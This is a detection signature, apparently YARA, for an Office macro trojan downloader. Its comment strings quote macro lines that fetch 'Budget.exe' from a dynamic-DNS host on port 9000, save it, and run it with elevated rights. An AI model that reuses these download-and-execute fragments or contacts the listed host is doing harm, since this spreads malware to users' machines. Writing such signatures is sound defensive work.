
rule TrojanDownloader_O97M_Donoff_STHW_MTB{
	meta:
		description = "TrojanDownloader:O97M/Donoff.STHW!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {78 48 74 74 70 2e 4f 70 65 6e 20 22 47 65 74 22 2c 20 22 68 74 74 70 3a 2f 2f 73 68 65 65 74 2e 64 75 63 6b 64 6e 73 2e 6f 72 67 3a 39 30 30 30 2f 42 75 64 67 65 74 2e 65 78 65 22 2c } //1 xHttp.Open "Get", "http://sheet.duckdns.org:9000/Budget.exe",
		$a_01_1 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 42 75 64 67 65 74 2e 65 78 65 22 2c 20 32 20 27 2f 2f 6f 76 65 72 77 72 69 74 65 } //1 .savetofile "Budget.exe", 2 '//overwrite
		$a_01_2 = {6f 62 6a 53 68 65 6c 6c 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 42 75 64 67 65 74 2e 65 78 65 22 2c 20 22 22 2c 20 22 22 2c 20 22 72 75 6e 61 73 22 2c 20 31 } //1 objShell.ShellExecute "Budget.exe", "", "", "runas", 1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}